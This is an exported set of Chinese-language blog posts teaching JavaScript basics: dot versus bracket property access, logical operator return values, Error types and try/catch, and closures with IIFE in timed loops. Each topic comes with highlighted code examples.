    <url>/2018/02/26/javascript%E7%82%B9%E4%B8%8E%E6%96%B9%E6%8B%AC%E5%8F%B7%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>成员访问运算符——点“.”与计算机成员访问符——中括号“[ ]”在使用中有很多相同点，同时也存在很多不同之处。</p>
<p>点运算符之后书写的属性名为标志符，中括号运算符后书写的属性名为字符串。</p>
<p>点运算符用起来更为简洁，中括号运算符通用性更强。</p>
<h5 id="中括号运算符能代替点运算符，但是点运算符不能代替中括号运算符。"><a href="#中括号运算符能代替点运算符，但是点运算符不能代替中括号运算符。" class="headerlink" title="中括号运算符能代替点运算符，但是点运算符不能代替中括号运算符。"></a>中括号运算符能代替点运算符，但是点运算符不能代替中括号运算符。</h5><span id="more"></span>
<h6 id="1-中括号“-”能以变量当属性名，点“-”不行。"><a href="#1-中括号“-”能以变量当属性名，点“-”不行。" class="headerlink" title="1. 中括号“[ ]”能以变量当属性名，点“.”不行。"></a>1. 中括号“[ ]”能以变量当属性名，点“.”不行。</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token string">"bar"</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
obj<span class="token punctuation">[</span>foo<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
<span class="token comment">// 输出的obj为&#123;foo: 123, bar: 456&#125;;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h6 id="2-中括号“-”能用数字或数学表达式当属性名，点“-”不行。"><a href="#2-中括号“-”能用数字或数学表达式当属性名，点“-”不行。" class="headerlink" title="2. 中括号“[ ]”能用数字或数学表达式当属性名，点“.”不行。"></a>2. 中括号“[ ]”能用数字或数学表达式当属性名，点“.”不行。</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"foo"</span><span class="token punctuation">;</span> <span class="token comment">// 报错</span>
obj<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"foo"</span><span class="token punctuation">;</span> <span class="token comment">// obj[1]与obj["1"]是相同的</span>
obj<span class="token punctuation">[</span><span class="token number">5</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"bar"</span><span class="token punctuation">;</span>
<span class="token comment">// 输出的obj为&#123;1: "foo", 2: "bar"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h6 id="3-中括号“-”能以js关键字、保留字当属性名，点“-”不行。"><a href="#3-中括号“-”能以js关键字、保留字当属性名，点“-”不行。" class="headerlink" title="3. 中括号“[ ]”能以js关键字、保留字当属性名，点“.”不行。"></a>3. 中括号“[ ]”能以js关键字、保留字当属性名，点“.”不行。</h6><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
obj<span class="token punctuation">.</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token comment">// 报错</span>
obj<span class="token punctuation">[</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
<span class="token comment">// 输出的obj为&#123;Symbol(): 9&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>成员访问运算符</tag>
        <tag>点</tag>
        <tag>方括号</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript逻辑运算符</title>
    <url>/2020/05/03/javascript%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<p>前端通常使用逻辑运算符作为条件判断语句的条件，只关心返回值是 truthy 还是 falsy。但非常容易忽略逻辑运算符可以被应用于任意类型值，多个任意类型值的逻辑运算返回值到底是什么。</p>
<blockquote>
<p>下面所有代码示例中的返回值均指运算返回值，而不是 console.log 函数返回值</p>
</blockquote>
<h2 id="（或）"><a href="#（或）" class="headerlink" title="||（或）"></a>||（或）</h2><p><strong>一个||（或）运算链将返回从左向右第一个真值，如果不存在真值，则返回运算链的最后一个值</strong>，例如：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为1（第一个真值）</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">||</span> <span class="token string">'no matter what'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为true（第一个真值）</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">||</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为1（第一个真值）</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">||</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为undefined（运算链最后一个值）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="amp-amp-（与）"><a href="#amp-amp-（与）" class="headerlink" title="&amp;&amp;（与）"></a>&amp;&amp;（与）</h2><p><strong>一个&amp;&amp;（与）运算链将返回从左向右第一个假值，如果不存在假值，则返回运算链的最后一个值</strong>，例如：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为0（第一个假值）</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">&amp;&amp;</span> <span class="token string">'no matter what'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为'no matter what'（运算链最后一个值）</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为null（第一个假值）</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为3（运算链最后一个值）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="（非）"><a href="#（非）" class="headerlink" title="!（非）"></a>!（非）</h2><p>!（非）运算符将操作数转化为布尔类型，并返回相反的值，两个非运算<code>!!</code>用来将某个值转化为布尔类型，也可以使用内置的 Boolean 函数来转换为布尔类型。<strong>非运算符在所有逻辑运算符中优先级最高，它总在<code>&amp;&amp;</code>和<code>||</code>前执行</strong>。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>逻辑运算符</tag>
        <tag>与、或、非</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript错误处理机制</title>
    <url>/2021/06/04/javascript%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="Error-对象"><a href="#Error-对象" class="headerlink" title="Error 对象"></a>Error 对象</h2><p>JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供 Error 构造函数，所有抛出的错误都是这个构造函数的实例。</p>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>ECMA-262 规定了 Error 对象包括两个属性：message 和 name。message 保存错误的信息，而 name 保存错误类型。浏览器厂商还对 error 对象属性做了扩展，添加了其他相关信息。其中实现最广泛的是 stack 属性，表示错误的栈信息。</p>
<p>可以使用 Error 构造函数来创建错误对象，如果指定 message 参数，则该 Error 对象将把它用作 message 属性；若不指定，它将使用空字符串作为 message 属性。</p>
<p>当不使用 new 操作符，直接使用 Error 构造函数像一个普通函数一样调用时，它的行为与使用 new 操作符时一致。</p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>Error 对象还有一个 toString 方法，该方法覆盖了对象原型上的 toString 方法，返回代表对象类型与信息的字符串。</p>
<span id="more"></span>

<h2 id="错误类型"><a href="#错误类型" class="headerlink" title="错误类型"></a>错误类型</h2><h3 id="原生错误类型"><a href="#原生错误类型" class="headerlink" title="原生错误类型"></a>原生错误类型</h3><p>ECMA-262 共定义了 8 种错误类型（InternalError 非标准错误类型，不推荐使用），其中包含最基础的错误类型 Error。</p>
<ul>
<li>Error 基础错误类型，其他错误类型继承自该类型，Error 类型错误很少见，这个类型主要供开发人员抛出自定义类型错误</li>
<li>EvalError 表示 eval()函数中发生的错误，ES5 后已不再使用 eval 函数，故该错误类型也不再出现，只是为了向前兼容仍然保留</li>
<li>RangeError 表示当数值变量或参数超出其有效范围时发生的错误</li>
<li>ReferenceError 表示引用了无效引用发生的错误</li>
<li>SyntaxError 表示语法错误</li>
<li>TypeError 表示当变量或参数不是有效类型时发生的错误</li>
<li>URIError 表示当 encodeURI()或 decodeURI()传递无效参数时发生的错误</li>
<li>AggregateError 表示多个错误包裹在一个错误中，例如在 Promise.any()中，当多个错误需要在一个操作中报告</li>
<li>InternalError (deprecated，非标准) 表示引发 JavaScript 引擎内部错误时发生的错误，例如，无限递归错误</li>
</ul>
<h3 id="自定义错误类型"><a href="#自定义错误类型" class="headerlink" title="自定义错误类型"></a>自定义错误类型</h3><p>除原生提供的几种错误类型外，还可以基于基础的错误类型，定义自己的错误对象。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 声明自定义错误类型</span>
<span class="token keyword">function</span> <span class="token function">CustomedError</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"CustomedError"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">CustomedError</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">CustomedError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> CustomedError<span class="token punctuation">;</span>
<span class="token comment">// 使用自定义错误类型</span>
<span class="token keyword">new</span> <span class="token class-name">CustomedError</span><span class="token punctuation">(</span><span class="token string">"这是自定义的错误！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>思考：这里是用原型来实现的，ES 如何用 class 来实现？</p>
<h2 id="throw-语句"><a href="#throw-语句" class="headerlink" title="throw 语句"></a>throw 语句</h2><p>使用 throw 语句抛出异常，当抛出异常时，throw 后面所跟的表达式表示异常值，异常值可以为任何类型。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">throw</span> <span class="token string">"Error2"</span><span class="token punctuation">;</span> <span class="token comment">// generates an exception with a string value</span>
<span class="token keyword">throw</span> <span class="token number">42</span><span class="token punctuation">;</span> <span class="token comment">// generates an exception with the value 42</span>
<span class="token keyword">throw</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// generates an exception with the value true</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Required"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// generates an error object with the message of Required</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>特别要注意的是：<strong>抛出错误的过程是阻塞的，后续的代码将中断不会执行</strong></p>
<h2 id="try-catch-语句"><a href="#try-catch-语句" class="headerlink" title="try catch 语句"></a>try catch 语句</h2><p>try catch 语句标记了要尝试的语句块，并定义了有异常抛出时的响应。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 要执行的语句</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>exception_var<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// exception_var 可选参数，throw抛出的异常变量</span>
  <span class="token comment">// 若try语句块中抛出错误时需要执行的语句</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// try语句执行后，无论是否有异常抛出还是捕获，都要执行的逻辑</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>try catch 语句块必需包含一个 catch 或 finally 块，或两个都包括。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 包含一个catch块</span>
<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token comment">// 包含一个finally块</span>
<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 都包含</span>
<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>若有错误从 try 块中抛出，程序会立刻跳转至 catch 块，否则 catch 块会被跳过；finally 块总是在 try 块和 catch 块执行完成后执行，无论是否有异常抛出。</p>
<p>你甚至可以嵌套 try catch 语句，若内部的 try 块没有对应的 catch 块，则会使用最近父级的 catch 块。</p>
<p>一个常见的用法是只捕获一小部分预期的错误，然后在其他情况下重新抛出错误：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 尝试执行的语句</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">RangeError</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 捕获范围类型错误</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 继续抛出其他类型错误</span>
    <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>任何嵌套 try catch 语句中的异常都只会被最近的 catch 块捕获一次，除非这个异常再次被抛出。当然在内部抛出的任何新异常，都会被外部捕获。</p>
<p>需要特别注意的一点是：<strong>如果 finally 块中有返回值，这个值将成为整个 try catch 语句的返回值，无论 try 块和 catch 块中有没有 return 语句。</strong>这也从侧面反映出，不论 try 块与 catch 块中是否有 return 语句，都不会影响 finally 块的执行。</p>
<blockquote>
<p>参考资料</p>
<p><a href="https://www.cnblogs.com/xiaohuochai/p/5677490.html">javascript 中的错误处理机制-小火柴的蓝色理想</a></p>
<p><a href="https://javascript.ruanyifeng.com/grammar/error.html#toc0">错误处理机制-阮一峰</a></p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error">MDN-Error</a></p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/throw">MDN-throw</a></p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/try...catch">MDN-try…catch</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>Error</tag>
        <tag>错误处理</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript闭包与IIFE</title>
    <url>/2018/06/15/javascript%E9%97%AD%E5%8C%85%E4%B8%8EIIFE/</url>
    <content><![CDATA[<p>先来看看这段代码是否能正确运行，我们期望的结果是输出“5，4， 3， 2， 1， go!”</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 延时输出了6个-1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行后发现输出了“-1， -1， -1， -1， -1，-1”，这是为什么呢？</p>
<span id="more"></span>

<h2 id="javascript-的运行机制"><a href="#javascript-的运行机制" class="headerlink" title="javascript 的运行机制"></a>javascript 的运行机制</h2><p>首先我们来了解一下 javascript 的运行机制，javascript 是单线程的，也就是说 javascript 在同一个时间只能做一件事。这就意味着所有的任务都要排队。例如通过网络访问读取数据的任务因为网络的问题通常返回结果较慢，此时主线程已经空闲，但后面的任务不得不排队等待。于是设计者就把任务分为同步任务与异步任务，同步任务是指在主线程上按顺序排队的任务，异步任务则是不进入主线程，而进入任务队列的任务。只有任务队列通知主线程可以执行某个异步任务了，该任务才会进入主线程。</p>
<p>大致运行机制如下：</p>
<ol>
<li>所有同步任务都在主线程上运行，形成一个执行栈</li>
<li>主线程外还有一个任务队列，异步任务运行有了结果就在任务队列中放置一个事件</li>
<li>一旦执行栈中所有同步任务执行完毕，就会读取任务队列中的事件，事件对应的异步任务就结束等待状态，进入执行栈，开始执行</li>
<li>主线程不断重复上面的三步，这样的重复就叫作事件循环</li>
</ol>
<p><strong>一个原则：执行栈中的代码（同步任务），总是在读取“任务队列”（异步任务）之前执行，异步任务执行时就是在调用回调函数。</strong></p>
<p><strong>知识回顾：什么是闭包？函数记住并访问所在的词法作用域，叫做闭包现象，函数对作用域的引用就叫闭包。</strong></p>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>有了这部分知识，我们再来看上面那段代码。for 循环是同步任务，在主线程中先运行，定时器 setTimeout 是异步任务，第一个参数是异步回调函数，第二个参数是推迟执行毫秒数。因此 for 循环第一次执行时，setTimeout 按推迟执行毫秒数在任务队列中设置了一个事件，此时又继续执行第二次 for 循环，又在任务队列中设置一个事件，依次类推，最后一次 for 循环执行完毕，任务队列中共设置了六个事件，此时主线程空闲，读取任务队列，开始按照不同的推迟毫秒数执行回调函数。回调函数声明时虽然是出现在 setTimeout 的参数里，但回调函数并不是在 setTimeout 中声明的（初学者很容易在这里搞错），又由于这里没有 ES6 的 let 或 const 声明，所以 for 循环中没有形成块作用域，回调函数相当于是在全局中声明，并作为参数传递给 setTimeout 方法。那么根据闭包的规则，回调函数形成了对全局作用域的闭包（一般我们不把对全局作用域的闭包叫做闭包，因为全局一直存在，不会被垃圾回收，我们就称为词法作用域）。根据 javascript 的词法作用域，回调函数调用时自身作用域中没有变量 i，沿作用域链向上查找是全局作用域，此时同步任务的 for 循环早已经执行完毕，i 变量的值是-1。故会按推迟的毫秒数输出 6 个-1。</p>
<h2 id="IIFE"><a href="#IIFE" class="headerlink" title="IIFE"></a>IIFE</h2><p>如何解决这个问题呢？相信看过闭包那章的人已经想到几种解决方案。我们先来看看 IIFE 的方案。严格来说 IIFE 本身并没有形成闭包，因为 IIFE 并没有在声明以外的地方被调用，不满足闭包的定义，但是 IIFE 利用函数表达式与其立即调用，形成了一个新的即时绑定的做用域。</p>
<p>这段代码会奏效吗？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 5， 4， 3， 2， 1， go！没有延时就输出了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>确实不会再输出-1 了，但是又出现了新问题，并没有按定时器定义的时间执行，而是直接全部输出了。这是因为 IIFE 立即执行的特点，虽然 IIFE 的立即执行使内部的匿名函数访问到了 for 循环每次调用时即时的变量 i，但这也使本应该在任务队列的异步回调函数成为了主线程中的即时调用函数，定时器就失效了。</p>
<p>那么我们把 IIFE 放在 setTimeout 方法的外部，这样就只建立一个新的作用域，而没有改变 setTimeout 异步回调函数的执行顺序，这个方案会解决问题吗？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 延时输出了6个-1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看起来，问题又回到了起点，还是输出了 6 个-1，但其实更进了一步，现在确实通过 IIFE 建立了一个新的作用域。for 循环完成后，从任务队列进入到主线程的回调函数对 IIFE 作用域的闭包使回调函数访问到了这个作用域，但是在这个作用域中并没有保存任何变量，回调函数继续沿作用域链向全局作用域查找变量 i，此时 for 循环已经结束，i 的值为-1。</p>
<p>那么我们将变量保存在这个作用域中，是不是就解决问题了呢？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">j</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 这里j是形参，可以任意起名字，也可以叫i</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> j<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里i是实参</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 正确地按定时输出了“5， 4， 3， 2， 1， go！”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面这段代码中我们把变量 i 作为参数传递给了 IIFE，在 IIFE 中我们可以给参数起任意的名称，这里是 j（也可以继续叫 i）。这样我们就把每次 for 循环产生的正确的 i 保存在了每次 for 循环新建的 IIFE 作用域中，调用 setTimeout 的回调函数时，就能通过闭包访问到正确的 i 了。</p>
<p>我们也可以不通过 IIFE 传递变量，而是直接在 IIFE 中声明变量，并将 i 的值赋给新声明的变量。这样也可以在新建的作用域中保存正确的 i 的拷贝。</p>
